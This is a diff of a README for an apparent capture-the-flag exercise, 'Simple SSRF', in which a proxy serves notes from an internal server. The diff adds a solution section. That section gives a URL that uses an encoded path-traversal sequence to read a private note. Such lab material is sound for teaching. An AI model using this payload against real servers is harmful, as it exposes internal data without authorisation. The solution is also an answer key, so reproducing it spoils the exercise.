@@ -1,7 +1,8 @@
 # Simple SSRF
-
 Difficulty: 2/10
-Goal: Reading the flag
+
+## Description
+A proxy server servs public notes in the internal server. break out, read the private note.
 
 ## set-up
 As simple as:
@@ -9,5 +10,7 @@ As simple as:
 npm install
 npm init
 ```
-## description
-A proxy server servs public notes in the internal server. break out, read the private note.
+## Solution:
+```
+http://ip:5050/proxy/internal_website/..%2fprivate%2fprivate_note
+```
